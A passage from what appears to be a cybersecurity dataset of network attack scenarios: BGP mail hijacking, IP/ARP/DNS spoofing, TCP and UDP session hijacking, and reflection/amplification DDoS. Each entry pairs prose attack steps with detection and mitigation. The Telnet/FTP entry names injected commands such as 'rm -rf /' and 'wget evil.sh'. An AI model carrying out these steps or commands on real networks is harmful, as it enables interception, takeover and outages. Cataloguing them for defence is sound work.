Attack Steps: Step 1: Attacker uses MXToolbox or dig to identify the IP address of mail exchangers (MX records) for the target domain (e.g., mail.company.com).Step 2: Identifies the prefix covering that IP (e.g., 192.0.2.0/24).Step 3: Prepares a BGP update for the prefix, announcing it via a rogue or compromised AS using ExaBGP.Step 4: Traffic to the target’s mail server is now routed to the attacker’s fake mail server.Step 5: Attacker sets up a mail server (e.g., Postfix or Sendmail) configured to receive and log all messages.Step 6: Incoming legitimate emails are delivered to the attacker instead of the real server, allowing passive surveillance.Step 7: Attacker can also re-forward the mail to the legitimate server to avoid alerting the recipient.Step 8: If DKIM/DMARC/SPF is not properly enforced, attacker can spoof outgoing emails as well.Step 9: Detection can be done by checking mail logs for routing inconsistencies or examining source IPs in headers.Step 10: Protect with strict SPF/DKIM/DMARC, enable SMTP TLS, and validate prefix ownership via RPKI.
Vulnerability: Lack of MX prefix filtering, insecure routing
Impact: Email snooping, credential theft, spear phishing setup
Detection Method: Monitor MX traffic AS paths, inspect SPF records, log mail server connection source IPs
Solution: Enforce SPF/DKIM/DMARC, validate prefix via RPKI, monitor MX AS origin, use encrypted mail transport (STARTTLS)
Tags: Email Hijack, MX Routing Abuse, Mail Snooping

Title: Attack via Bogon Prefixes
Attack Type: Malicious Use of Unrouted/Bogon IP Prefixes
Scenario Description: Attacker sends traffic from or to bogon IP ranges (unallocated or reserved blocks), exploiting lack of filtering to evade tracking or abuse routing trust.
Tools Used: Team Cymru Bogon List, ExaBGP, GNS3, BGPMon
Attack Steps: Step 1: Attacker identifies bogon IP ranges (e.g., 0.0.0.0/8, 240.0.0.0/4, 169.254.0.0/16) using trusted sources like Team Cymru or IANA.Step 2: Configures routers or servers to spoof traffic from a bogon IP address or use that prefix in routing announcements.Step 3: Sends crafted packets (e.g., phishing emails, DNS replies) that appear to originate from bogon ranges — many tools don’t log or block these properly.Step 4: Alternatively, announces bogon prefixes in BGP updates via a compromised peer.Step 5: Because many routers don’t validate bogons strictly, some networks may accept or route traffic from these IPs.Step 6: Attacker now has near-anonymous access, or causes monitoring systems to ignore the traffic due to invalid source.Step 7: Some DDoS attacks also originate from bogon space to bypass mitigation systems.Step 8: Detection requires continuous validation of incoming/outgoing prefixes and packet source IP inspection.Step 9: Filtering bogons at ISP borders is essential — either statically or via BGP-based bogon lists.Step 10: Team Cymru and others provide free bogon route feeds to automate this process.
Impact: Anonymous traffic, filter bypass, blackhole abuse
Detection Method: Enable bogon detection in firewalls; compare flow logs against current bogon allocations
Solution: Drop all bogon source/destination traffic; use Team Cymru bogon feed; enforce strict IP ingress/egress filters
Tags: Bogon Abuse, Covert Routing, Filter Evasion

Title: ICMP/TCP Reset Injection During Hijack
Scenario Description: Attacker injects forged TCP RST or ICMP Unreachable packets during a hijacked route, forcibly terminating sessions or breaking encrypted tunnels.
Attack Steps: Step 1: Attacker hijacks or sniffs a TCP connection between two endpoints (e.g., via BGP hijack or LAN MITM).Step 2: Observes the source/destination IPs, ports, and sequence/acknowledgement numbers.Step 3: Using tools like hping3 or Scapy, the attacker forges TCP packets with the RST flag set, using the same IP/port pair.Step 4: Inserts correct or near-correct SEQ numbers so the forged packet is accepted by the target’s TCP stack.Step 5: If successful, one or both ends immediately terminate the session (as RST is interpreted as a forced disconnect).Step 6: For UDP or encrypted tunnels (e.g., IPsec, OpenVPN), attacker may send ICMP Port Unreachable or ICMP Fragmentation Needed packets to interrupt or degrade traffic.Step 7: This technique is used in censorship (e.g., Great Firewall), denial-of-service, or session sniping.Step 8: Detection involves spotting RST storms, forged TTLs, or sequence mismatches.Step 9: Defenders should enforce TLS-level session resilience, packet integrity validation, and deep packet inspection.Step 10: Blocking spoofed traffic at the edge and monitoring TTL patterns is essential.
Vulnerability: No validation of TCP RST/ICMP packet authenticity
Impact: Session kill, VPN disruption, censorship bypass
Detection Method: Detect duplicate RSTs, TTL anomalies, or ICMP floods in active sessions
Solution: Use IPsec/TLS tunnels with anti-replay, validate TCP/IP stacks, and block spoofed packets using BCP38 filtering
Tags: TCP RST Injection, Censorship, Session Sniping

Title: Stateless Session IP Hijack
Scenario Description: App or service identifies a session only by IP address (no token, no cookie), allowing attackers to impersonate users sharing the same source IP.
Attack Steps: Step 1: Attacker identifies a web application or backend that tracks user sessions only by IP address (e.g., X-Forwarded-For, reverse proxy logs, or flawed session tracking).Step 2: From a shared network (e.g., public Wi-Fi, ISP NAT, VPN exit node), attacker initiates their own session to the app to get a feel for the structure (e.g., endpoints, request format).Step 3: Attacker then sniffs legitimate user traffic (or guesses usage patterns) to detect valid sessions from the same IP.Step 4: Sends identical or slightly modified requests from the same IP, causing the server to treat attacker as the victim.Step 5: This allows data theft, session hijack, or privilege escalation without credentials.Step 6: Often seen in improperly designed internal apps or legacy devices.Step 7: If load balancers or proxies forward client IPs incorrectly, it increases risk.Step 8: Detection involves identifying multiple users from same IP doing conflicting actions.Step 9: Defense includes always binding sessions to cookies, tokens, or user-agents — never IP-only.Step 10: Use MFA or rotating tokens even for same IP-originating sessions.
Vulnerability: Session bound only to IP, no token-based validation
Detection Method: Analyze logs for IP-shared users, detect account switching from same IP
Solution: Use session tokens tied to identity + IP + UA; reject IP-only session logic; enforce token rotation and session expiry
Tags: Stateless Hijack, NAT Abuse, Proxy Session Attack

Title: TCP Session Hijack (Predictable Sequence Numbers)
Scenario Description: Attacker predicts TCP sequence/ack numbers and injects malicious packets into an active TCP session, fully hijacking or corrupting the stream.
Attack Steps: Step 1: Attacker sniffs or guesses parameters of an ongoing TCP session — source/destination IPs, ports, and current SEQ/ACK numbers.Step 2: If sniffing is not possible (off-path attacker), they exploit predictable TCP sequence numbers (e.g., older Linux/Windows stacks with poor RNG).Step 3: Using hping3 or Scapy, attacker sends crafted TCP packets with injected payloads and spoofed headers.Step 4: Injected packets fall within the accepted sequence window of the receiver, causing acceptance and processing of data.Step 5: If done correctly, the attacker can send commands (e.g., fake HTTP responses, shell commands in telnet/FTP, etc.).Step 6: In more advanced cases, attacker can desync the stream and force either endpoint to reset.Step 7: Classic attacks include telnet hijacks, MITM on HTTP sessions, or remote shell injection.Step 8: Detection includes sequence number anomalies, retransmissions, or out-of-window ACKs.Step 9: Modern OSes use strong sequence randomization, but legacy/IoT devices may still be vulnerable.Step 10: Protect by enforcing encrypted sessions (TLS/SSH), disabling plaintext services, and using OSes with secure TCP stacks.
Impact: Command injection, session takeover, remote control
Detection Method: Monitor SEQ/ACK window anomalies, reset rate spikes, and early stream desync
Solution: Use secure protocols (SSH, HTTPS), upgrade device firmware, apply OS patches, avoid telnet and plaintext channels
Tags: TCP Hijack, Sequence Prediction, Legacy Exploit

Title: UDP Session Spoofing (No Handshake)
Attack Type: Blind Spoofing of Stateless UDP Protocols
Scenario Description: Because UDP has no connection state or handshake, attacker can spoof UDP packets as if they’re part of an existing session, enabling hijack or injection.
Attack Steps: Step 1: Attacker identifies a service using UDP (e.g., DNS, VoIP, TFTP, streaming protocols) and their typical source/destination ports.Step 2: Crafts fake UDP packets using the same 5-tuple (source/destination IP + ports + protocol) that the legitimate traffic uses.Step 3: Injects malicious payloads (e.g., fake DNS answers, SIP INVITE requests, TFTP writes) to appear as valid traffic to the receiver.Step 4: No handshake means the receiver can't validate authenticity unless application-layer security is present.Step 5: VoIP hijack examples include call rerouting via forged SIP headers.Step 6: DNS cache poisoning is also possible if the victim accepts spoofed replies.Step 7: Detection is hard since UDP lacks state; anomalies are usually spotted in app logic or logs.Step 8: Tools like Wireshark help correlate timing and detect duplicate or unexpected UDP responses.Step 9: Mitigation includes using DTLS (Datagram TLS), app-layer authentication, or switching to TCP for sensitive data.Step 10: Drop malformed UDP packets at the firewall, and apply strict allowlists for IP-port pairs.
Vulnerability: No session state or handshake, spoofable headers
Impact: DNS poisoning, call reroute, fake data injection
Detection Method: Monitor app-layer logs for unexpected inputs or duplicated requests
Solution: Use DTLS or TCP fallback for sensitive operations; implement app-level validation and strong client authentication
Tags: UDP Spoofing, Stateless Protocol Attack, VoIP Hijack

Title: ARP Spoof + IP Spoof
Scenario Description: Attacker tricks the local router or victim’s ARP table to impersonate another host, then uses spoofed IP packets to hijack or inject into their sessions.
Attack Steps: Step 1: Attacker connects to the same LAN/subnet as the target (e.g., public Wi-Fi, office LAN).Step 2: Scans the network using nmap or arp-scan to identify the IP and MAC addresses of the gateway and target device.Step 3: Starts ARP spoofing using arpspoof or ettercap, telling the victim “I am the gateway” and telling the gateway “I am the victim.”Step 4: This tricks both into sending packets through the attacker’s machine — creating a full man-in-the-middle (MITM) setup.Step 5: Enables IP forwarding and packet logging (e.g., with iptables, tcpdump, or Wireshark).Step 6: Now, attacker uses Scapy or other tools to send spoofed IP packets impersonating the victim — allowing session hijack or injection (e.g., fake HTTP responses).Step 7: Attack is successful when the attacker can alter traffic without breaking the session.Step 8: Detection involves seeing duplicate MACs in ARP cache (arp -a), packet delays, or sudden routing anomalies.Step 9: Defenders can use ARP inspection or static ARP tables.Step 10: Use HTTPS, TLS pinning, and switch monitoring to defend.
Detection Method: Monitor ARP table for duplicate IPs or MAC mismatches; alert on traffic anomalies
Solution: Use static ARP entries, enable dynamic ARP inspection (DAI), enforce TLS or IPsec
Tags: ARP Spoofing, LAN MITM, IP Injection

Title: DNS Spoof + IP Spoof
Scenario Description: Attacker poisons a DNS cache or injects fake DNS replies, then sends fake HTTP responses from a spoofed IP to fully mimic a target site.
Attack Steps: Step 1: Attacker monitors DNS requests on the same network (LAN) or targets a vulnerable resolver.Step 2: Uses dnsspoof, Bettercap, or Responder to send a forged DNS reply before the real one arrives — tricking victim into resolving to attacker-controlled IP.Step 3: If DNS cache is poisoned, this fake record persists, redirecting future visits.Step 4: Attacker hosts a fake version of the site (e.g., login.google.com) on their machine, using self-signed or stolen TLS certificates.Step 5: Uses IP spoofing via Scapy or proxy tools to reply with data that appears to come from the legitimate service IP.Step 6: Victim sees a near-identical site and may enter credentials or download malware.Step 7: Some attacks skip TLS warnings via HTTP downgrade or expired cert tricks.Step 8: DNSSEC or DoH may stop this — but many networks don’t enforce it.Step 9: Detect via DNS record mismatch, SSL cert mismatches, or multiple DNS answers.Step 10: Enforce DNSSEC, use encrypted DNS, and validate certificate chains.
Vulnerability: DNS trusting plain UDP; lack of DoH/DoT, IP spoofing
Detection Method: Look for multiple A-record replies; use DNS monitoring and TLS cert validation
Solution: Enable DNSSEC, enforce HTTPS with HSTS, validate certs, block rogue DNS responses
Tags: DNS Poisoning, IP Spoof, Fake Web Injection

Title: Weak Firewall/ACL Abuse via IP Spoof
Scenario Description: Attacker spoofs a trusted IP address to bypass firewall or ACL rules which allow traffic based solely on IP without authentication.
Tools Used: Scapy, iptables, curl, VPN tunneling tools
Attack Steps: Step 1: Attacker identifies a firewall or system that allows requests from “trusted” IPs (e.g., 10.0.0.0/8, or 203.0.113.5).Step 2: Configures packet crafting tool like Scapy or hping3 to forge TCP/UDP packets with the source IP set to the trusted address.Step 3: Sends crafted packets to the firewall, hoping they are accepted due to IP-based allow rules.Step 4: If the server replies, attacker may not see the response unless they are on-path or use asymmetric routing tricks.Step 5: This is most effective in UDP protocols, or stateless protocols where reply is not mandatory.Step 6: Alternately, attacker can tunnel traffic through a compromised host inside the trusted range to complete full sessions.Step 7: Common in legacy setups, cloud misconfigs, or industrial control networks (ICS).Step 8: Detection requires IP-to-MAC mismatch logging or inbound spoof detection.Step 9: Firewalls must validate ingress interfaces for expected source ranges.Step 10: Use proper stateful filtering and not IP-allow rules alone.
Vulnerability: Trusting source IP without verifying state/session
Detection Method: Compare IP source to interface; validate asymmetric or spoofed traffic
Solution: Apply strict stateful firewalls; enforce authentication at app level; use token-based or cert-based access controls
Tags: IP Spoof, Firewall Bypass, Trust Exploitation

Title: Man-in-the-Middle via IP Spoof (Same Subnet)
Attack Type: On-path Spoofed Identity in Flat Network
Scenario Description: Attacker spoofs an IP address on the same subnet to perform MITM, capturing or injecting traffic, especially if MAC filtering is weak.
Attack Steps: Step 1: Attacker joins the same subnet as the target system (e.g., coworking space, flat network, open Wi-Fi).Step 2: Identifies the IP and MAC of the target using arp-scan or nmap.Step 3: Uses macchanger to clone the MAC address of the victim (MAC spoofing).Step 4: Configures attacker’s device to take over the same IP (IP spoofing).Step 5: Due to flat network, routers/switches may not validate MAC/IP uniqueness — leading to successful MITM.Step 6: Captures traffic with tcpdump or injects traffic with Scapy.Step 7: Attacker can disrupt legitimate connection (DoS) or perform silent packet relay.Step 8: Detect with ARP table anomalies or duplicate IP detection tools.Step 9: Prevention includes switch-level protections like DHCP snooping, DAI, and MAC lockdown.Step 10: For critical apps, use VLAN segmentation and mutual TLS encryption.
Vulnerability: No IP/MAC validation in flat networks
Detection Method: Monitor for duplicate MAC/IP events; log ARP and IP conflicts; alert on switching behavior
Solution: Use VLANs, DAI (Dynamic ARP Inspection), port security; enforce MAC-IP binding at switch level
Tags: IP Spoofing, Subnet MITM, MAC Cloning Attack

Title: Telnet/FTP Session Hijacking
Scenario Description: Attacker hijacks unencrypted sessions (Telnet or FTP) to inject commands by spoofing packets or desynchronizing the session.
Attack Steps: Step 1: Attacker identifies that the target server is running Telnet (port 23) or FTP (port 21), both of which transmit data unencrypted over TCP.Step 2: Joins the same LAN as the client or uses routing hijack (e.g., ARP spoofing, BGP leak) to observe traffic.Step 3: Uses tcpdump or Wireshark to sniff active Telnet/FTP sessions and extract TCP SEQ/ACK values, source/destination IPs and ports.Step 4: Crafts TCP packets with correct sequence numbers using Scapy or hping3, with RST/ACK flags or malicious commands like rm -rf / or wget evil.sh injected.Step 5: Sends forged packet mid-session, tricking the server into accepting it as a real command.Step 6: Optionally, attacker can send a TCP RST to the real client to disconnect it, completing a session hijack.Step 7: Since Telnet and FTP do not use encryption or session validation, the spoofed data is accepted without detection.Step 8: Detection is possible by monitoring TCP stream inconsistencies, unusual SEQ numbers, or RST storms.Step 9: Prevention includes disabling legacy services, enforcing SSH/SFTP, and using encrypted management paths.
Impact: Full command execution, data theft, shell compromise
Detection Method: Monitor legacy ports, track unusual SEQ/ACK behavior, detect multiple RSTs or command anomalies
Solution: Disable Telnet/FTP; replace with SSH/SFTP; use firewall to block legacy ports; log access to legacy services
Tags: Telnet Hijack, Legacy Protocol Abuse, Plaintext Injection

Title: NAT Table Confusion Attack
Attack Type: NAT Spoofing to Confuse Flow Mapping
Scenario Description: Attacker spoofs internal IP+port pairs to confuse NAT device, making malicious packets appear as valid return traffic and gain session access.
Tools Used: Scapy, nmap, Wireshark, custom Python NAT tester
Attack Steps: Step 1: Attacker identifies that the target network uses NAT (Network Address Translation) to allow internal devices to access the internet via one public IP.Step 2: Attacker sniffs or predicts NAT mappings by sending crafted traffic to a NATed device and observing port behaviors.Step 3: If NAT behavior is predictable (e.g., incremental port mapping), attacker forges packets from the internet with spoofed internal source ports and destination IPs.Step 4: NAT device mistakenly allows the malicious response, assuming it matches an existing flow.Step 5: This packet is delivered to the internal client, even though no legitimate session exists.Step 6: This can be used for session injection, malware delivery, or partial command injection.Step 7: More effective in symmetric or cone NATs without state validation.Step 8: Detection involves logging mismatched NAT table entries, unexpected traffic to internal clients.Step 9: Prevention includes random port NAT mapping, stateful inspection, and deep packet validation at the edge.Step 10: Do not expose NATed hosts directly without firewall and session-aware inspection.
Vulnerability: Predictable NAT behavior and poor state enforcement
Impact: Session hijack, partial injection, C2 command spoofing
Detection Method: Track unexpected inbound traffic to internal IPs behind NAT; detect NAT state anomalies
Solution: Use random port mapping; enforce strict NAT validation; block unsolicited inbound traffic from public networks
Tags: NAT Abuse, IP Spoofing, Session Confusion Attack

Title: Bypassing IP Rate-Limits
Attack Type: IP Rotation / Spoofing to Evade Controls
Scenario Description: Attacker uses IP spoofing, proxy chains, or IP cycling to evade rate-limits, brute-force bans, or WAF protections that enforce per-IP thresholds.
Attack Steps: Step 1: Attacker identifies a service (e.g., login API, comment form, download portal) that applies rate-limits or CAPTCHA based on client IP.Step 2: Configures proxy chains (e.g., using tor, proxychains, or rotating proxies) to send each request from a different IP.Step 3: Alternately, attacker spoofs source IPs using Scapy (in stateless protocols like UDP), or rotates through VPN IPs.Step 4: Continues sending requests (e.g., password guesses, downloads, API hits) until goal is achieved, avoiding rate-limit triggers.Step 5: In brute-force login scenarios, attacker can bypass lockout rules that are per-IP, allowing continuous guessing.Step 6: Tools like Burp Suite Intruder allow fast automation of this process with IP header spoofing (X-Forwarded-For, Client-IP).Step 7: Detection involves seeing many IPs hitting same endpoint with similar headers, user-agents, or timing.Step 8: Defenders should track behavior by session ID, cookies, browser fingerprints, not just IP.Step 9: WAFs can correlate patterns using ML/behavioral techniques.Step 10: Block high-speed IP rotation sources like proxy farms or VPN abuse.
Target Type: Web APIs, Login Portals, WAF Targets
Vulnerability: Rate-limits based only on IP field
Detection Method: Detect high-velocity patterns, fingerprint-based tracking, and unusual proxy usage
Solution: Use CAPTCHA on all key functions; enforce session-based rate-limits; implement browser fingerprinting and token validation
Tags: IP Rotation, WAF Bypass, API Rate Limit Evasion

Title: Spoofed Source IP in API Calls
Attack Type: Faking Source IP to Bypass API Auth or Access Checks
Scenario Description: Attacker crafts API requests with a spoofed source IP or header (e.g., X-Forwarded-For) to trick the server into granting access or skipping security checks.
Attack Steps: Step 1: Attacker finds an API or web app that uses source IP address (or IP header) to grant access (e.g., whitelist: only 192.168.1.10 can call this endpoint).Step 2: Crafts a request using tools like curl or Burp Suite and manually sets the header X-Forwarded-For: 192.168.1.10 or other spoofed IP values.Step 3: Sends the request to the API gateway or reverse proxy.Step 4: If the backend trusts the header blindly, it grants access assuming the request is from a whitelisted IP.Step 5: In more advanced attacks, attacker may spoof UDP-based API calls using raw socket tools (Scapy).Step 6: Servers that fail to validate header origin are vulnerable.Step 7: This can lead to sensitive function access (e.g., /admin, /internal/api) or firewall rule bypass.Step 8: Detection involves logging both source IP and X-Forwarded-For headers and comparing mismatches.Step 9: Secure setups validate X-Forwarded-For only from trusted proxies.Step 10: Fix by ignoring spoofable headers unless verified by known upstreams.
Vulnerability: Blind trust in spoofable headers / IP
Detection Method: Compare source IP vs forwarded IP; alert on mismatch; reject spoofed headers if not via known proxies
Solution: Validate headers only from trusted sources; apply authentication regardless of IP; implement zero-trust policies
Tags: API IP Spoof, Header Forgery, Whitelist Bypass

Title: VPN Session Hijack via IP Cloning
Attack Type: Session Theft via Same IP + Weak Auth
Scenario Description: Attacker spoofs or gains the same public IP as a VPN client, hijacking a VPN session if the VPN provider uses IP only for session tracking.
Attack Steps: Step 1: Attacker observes that a VPN service or enterprise VPN tracks sessions based only on IP (e.g., 203.0.113.25).Step 2: Attacker uses MITM, BGP hijack, or cloud server from the same IP range to mimic the legitimate user’s public IP.Step 3: Captures authentication cookies or keys if VPN lacks additional user-level auth (e.g., OTP, certs).Step 4: Attacker then attempts to recreate the session from the spoofed or cloned IP.Step 5: In UDP-based VPNs (e.g., OpenVPN, WireGuard), attacker can forge packet flows without handshakes, gaining partial session injection.Step 6: Sends data with same 5-tuple (source/dest IP, port, protocol) and matches the session timing, bypassing state validation.Step 7: If the VPN server is stateless or improperly configured, it may accept and route attacker’s packets as legitimate.Step 8: Detection includes noticing double flows from same IP, mismatched timing, or duplicate MACs/IPs.Step 9: Secure VPN setups use strong per-device credentials and mutual TLS.Step 10: Always combine IP checks with user-level identity proof (cert, MFA).
Vulnerability: IP-only session validation + no per-user auth
Impact: Full VPN hijack, access to internal assets
Detection Method: Monitor for simultaneous sessions from same IP; alert on unusual session timing or double packets
Solution: Use device-bound certs, mutual TLS, MFA, and avoid IP-only validation in VPN design
Tags: VPN, IP Spoof, Session Hijack, Weak Auth

Title: UDP Reflection Attack
Attack Type: Reflection-Based DDoS via Spoofed UDP Requests
Scenario Description: Attacker sends spoofed UDP packets to services like NTP, DNS, or SSDP, causing them to flood the victim with large replies.
Tools Used: hping3, Scapy, nmap, public UDP services
Attack Steps: Step 1: Attacker scans the internet using nmap or similar tools to find public UDP services that respond with large packets (e.g., NTP, DNS, Memcached, SSDP).Step 2: Crafts small UDP requests to those services with a spoofed source IP — the IP of the victim (e.g., 192.0.2.10).Step 3: The services (e.g., open DNS servers) respond to the victim’s IP with a much larger reply, not knowing it’s spoofed.Step 4: Attacker repeats this at scale, sending thousands of such spoofed packets per second.Step 5: Victim is overwhelmed with reflected UDP responses from many sources (called reflectors), resulting in denial of service (DoS).Step 6: Common exploited ports: DNS(53), NTP(123), SSDP(1900), CHARGEN(19), Memcached(11211).Step 7: Detection includes flood of unsolicited UDP responses, spoofed packets in logs, and traffic to UDP-heavy services.Step 8: Prevention at the ISP level includes egress filtering (BCP 38) to block spoofed packets.Step 9: Defenders can rate-limit or block incoming UDP packets from unusual services.Step 10: Disable or restrict unnecessary UDP services from responding publicly.
Vulnerability: UDP allows response to spoofed IPs
Detection Method: Monitor for high UDP in/out ratio, detect unsolicited responses, compare traffic against known baselines
Solution: Enable egress filtering (BCP 38); disable UDP services from being open reflectors; use anti-spoof ACLs

Title: DNS Amplification
Scenario Description: Attacker sends spoofed DNS queries to open resolvers with “ANY” type, getting huge responses sent to victim’s IP address.
Tools Used: dnsmasq, dig, hping3, spoofed packet tools
Attack Steps: Step 1: Attacker finds public, recursive DNS resolvers that respond to unauthenticated external queries.Step 2: Sends a spoofed DNS query using tools like hping3 or Scapy, setting source IP to victim’s address and query type to “ANY” (which requests all records).Step 3: The DNS server responds to the victim with a massive response containing multiple A, MX, TXT, NS, and SOA records.Step 4: Attacker repeats this from thousands of DNS servers to amplify bandwidth toward the victim.Step 5: Typical amplification factor is between 28x–54x (1 small query → 54x bigger response).Step 6: Flood can overwhelm victim’s router, server, or upstream ISP link.Step 7: Detection involves large inbound DNS responses without matching requests.Step 8: Prevention includes disabling open recursive DNS on internet-facing servers and using response rate limiting (RRL).Step 9: ISP should drop spoofed packets via ingress filtering (BCP 38).Step 10: DNS servers should validate source IPs and restrict recursion to internal IP ranges only.
Vulnerability: Unrestricted DNS recursion + spoofable UDP IPs
Detection Method: Monitor for DNS ANY queries; detect inbound response floods; analyze DNS logs
Solution: Disable DNS recursion for external clients; enforce RRL; apply egress and ingress spoof filtering

Title: NTP Amplification
Scenario Description: Attacker uses spoofed “monlist” or “ntpdc” requests to NTP servers, triggering a flood of responses to a victim.
Attack Steps: Step 1: Attacker scans for vulnerable NTP servers that support the “monlist” or ntpdc query types, which return a list of past clients.Step 2: Crafts spoofed UDP requests to these NTP servers, setting source IP as the victim’s IP.Step 3: Each small request triggers a large response (hundreds of bytes to kilobytes) to the victim’s IP address.Step 4: Attacker launches thousands of these spoofed requests per second to many open NTP servers.Step 5: The victim is overwhelmed with NTP response traffic, leading to service degradation or full DoS.Step 6: Amplification factor ranges from 20x to 200x depending on the server response size.Step 7: Detection involves large inbound UDP traffic from port 123, especially without matching outbound requests.Step 8: Defenders should configure NTP servers to disable monlist and restrict ntpdc usage.Step 9: ISPs must implement egress filtering to prevent spoofed IPs.Step 10: Monitor public NTP exposure via services like Shodan or Censys and shut down vulnerable instances.
Vulnerability: NTP “monlist” & UDP response to spoofed IPs
Detection Method: Watch for unsolicited NTP replies; monitor port 123 traffic; apply anomaly detection
Solution: Disable monlist; restrict NTP to internal use; apply firewall rules to block public NTP queries

Title: SSDP Reflection
Scenario Description: Attacker abuses Universal Plug and Play (UPnP) SSDP protocol to reflect and amplify traffic to victim via spoofed UDP packets.
Attack Steps: Step 1: Attacker scans the internet using nmap or SSDP scripts to find UPnP-enabled devices listening on UDP port 1900.Step 2: Crafts a fake SSDP M-SEARCH request using tools like hping3 or Scapy, but spoofs the source IP to be the victim’s address.Step 3: Sends thousands of these spoofed requests to identified SSDP devices.Step 4: Each device replies to the victim with a larger UDP response containing device/service info, amplifying the size of the original request.Step 5: The victim becomes flooded with UDP responses from many devices, leading to service degradation or complete denial of service (DoS).Step 6: The amplification factor ranges from 30x to 100x, depending on device configuration.Step 7: Detection involves monitoring for spikes in unsolicited UDP/1900 traffic.Step 8: Defenders can scan for local UPnP devices and disable SSDP where not required.Step 9: ISPs should filter outbound spoofed packets.Step 10: Use access control lists (ACLs) to block SSDP on internet-facing interfaces.
Vulnerability: SSDP responds to spoofed IP, amplifies response
Detection Method: Monitor for large UDP/1900 replies; look for mismatched request/response patterns
Solution: Disable UPnP/SSDP on edge devices; enforce ACLs; filter spoofed packets (BCP 38)

Title: SNMP Reflection
Scenario Description: SNMP-enabled devices respond to small spoofed UDP queries with large responses, which get sent to the victim’s IP address.
Attack Steps: Step 1: Attacker uses nmap with SNMP scripts to find publicly accessible SNMP devices listening on UDP port 161.Step 2: Sends spoofed SNMP GET or GETBULK requests using Scapy or raw packet tools, setting the source IP to the victim’s IP.Step 3: The SNMP device sends a large amount of information (system info, ARP tables, routing tables) in the response back to the spoofed IP — the victim.Step 4: Attacker repeats this across many SNMP devices, sending thousands of requests per second.Step 5: This creates a reflection-based denial-of-service attack, overwhelming the victim’s bandwidth.Step 6: Amplification factor ranges between 6x to 10x.Step 7: Detection involves observing high-volume unsolicited UDP/161 responses.Step 8: Defenders should disable public SNMP or restrict it via firewall rules to internal use only.Step 9: Use rate limiting and SNMPv3 where possible.Step 10: ISPs must drop spoofed traffic leaving their networks.
Vulnerability: SNMP responds to spoofed UDP requests
Detection Method: Monitor unsolicited port 161 traffic; alert on unknown SNMP devices
Solution: Restrict SNMP to internal ranges only; upgrade to SNMPv3; rate-limit SNMP responses

Title: TFTP Reflection
Attack Type: Abuse of Trivial File Transfer Protocol
Scenario Description: Attacker uses spoofed UDP packets to abuse TFTP servers into sending file responses to a victim, acting as a reflection channel.
Attack Steps: Step 1: Attacker identifies public TFTP servers via nmap or via internet scans (e.g., Shodan). TFTP uses UDP port 69 and does not require authentication.Step 2: Attacker crafts a spoofed TFTP read request (RRQ) asking for a common file (e.g., config, logs), and sets source IP to be the victim’s IP address.Step 3: The TFTP server sends multiple UDP packets containing the file back to the victim’s IP, thinking it’s a legitimate request.Step 4: Repeating this across many servers or with multiple large files can lead to data flooding at the victim’s end.Step 5: TFTP’s lack of authentication or session management makes it easy to abuse.Step 6: Detection involves seeing unexpected UDP/69 packets and data-heavy flows from TFTP sources.Step 7: Defenders should disable TFTP unless absolutely required, and block port 69 on public interfaces.Step 8: Rate-limiting responses on TFTP servers and using internal-only deployment helps mitigate this.Step 9: ISPs should use BCP 38 to prevent IP spoofing.Step 10: Never expose TFTP on public internet-facing systems.
Vulnerability: TFTP lacks authentication & allows file flooding
Detection Method: Analyze UDP/69 traffic; detect file reply bursts without matching requests
Solution: Disable public TFTP; firewall restrict port 69; rate-limit file reply packets
Tags: TFTP DDoS, Reflection, Legacy Protocol Abuse

Title: Memcached Amplification
Attack Type: Extreme Amplification DDoS via UDP-based Memcached
Scenario Description: Attacker uses spoofed UDP requests to vulnerable Memcached servers, causing them to send massive responses to a victim’s IP.
Attack Steps: Step 1: Attacker searches for Memcached servers that have UDP port 11211 open and are accessible from the internet.Step 2: Uses nmap or tools like Shodan to locate such servers.Step 3: Sends spoofed get or stats requests over UDP to the Memcached server, with the source IP spoofed to the victim’s IP.Step 4: The server responds with cached content (sometimes hundreds of kilobytes) back to the victim’s IP.Step 5: The attacker can preload the Memcached server with large dummy values (via TCP), then trigger them over UDP.Step 6: Amplification factor can exceed 10,000x — one of the highest known.Step 7: The result is an overwhelming DDoS flood toward the victim, capable of knocking down major services.Step 8: Detection includes spikes in UDP/11211 traffic and large packets sent to single targets.Step 9: Defense involves disabling UDP support on Memcached (default should be TCP-only), and firewalling port 11211.Step 10: ISPs must block spoofed UDP traffic from leaving their networks.
Impact: Massive DDoS (up to 1.3 Tbps in real attacks)
Detection Method: Monitor UDP/11211; alert on large response bursts; analyze Memcached activity
Solution: Disable UDP on Memcached; firewall 11211; restrict to internal IPs only
Tags: Memcached DDoS, High Amplification, IP Spoof

Title: CLDAP Reflection
Attack Type: Reflection Amplification DDoS via Connectionless LDAP
Scenario Description: Attacker sends spoofed requests to CLDAP servers using UDP/389, which return large replies to victim IPs, enabling high-bandwidth denial-of-service attacks.
Attack Steps: Step 1: Attacker uses nmap or Shodan to identify internet-exposed CLDAP servers (Connectionless LDAP over UDP, port 389).Step 2: Crafts a forged CLDAP query, spoofing the victim’s IP as the source, using Scapy or raw UDP packet tools.Step 3: The vulnerable CLDAP server receives the request and sends a large response back to the victim’s IP, often 50–70x larger than the original query.Step 4: Attacker repeats this at a large scale using many CLDAP servers, resulting in a flood of UDP packets targeting the victim.Step 5: This overwhelms the victim’s network or server bandwidth, causing outages or latency.Step 6: Common targets include Active Directory servers misconfigured for external CLDAP access.Step 7: Detection involves large volumes of UDP/389 traffic to a single external IP.Step 8: Defenders should disable CLDAP for external use and rely on TCP-based LDAP with authentication.Step 9: Firewalls should block UDP/389 from the internet unless absolutely needed.Step 10: ISP must apply BCP 38 filtering to prevent spoofed UDP traffic.
Vulnerability: CLDAP allows unauthenticated replies to spoofed IPs
Impact: High amplification DDoS, potential for large-scale outages
Detection Method: Monitor for UDP/389 surges; detect mismatched queries/responses
Solution: Disable CLDAP externally; block UDP/389 at edge; use TCP-based LDAP internally

Title: Chargen/QOTD Reflection
Scenario Description: Legacy services like Chargen and QOTD respond to spoofed UDP or TCP requests with character streams, which are reflected to victims in DDoS attacks.
Tools Used: nmap, hping3, Scapy, legacy system emulators
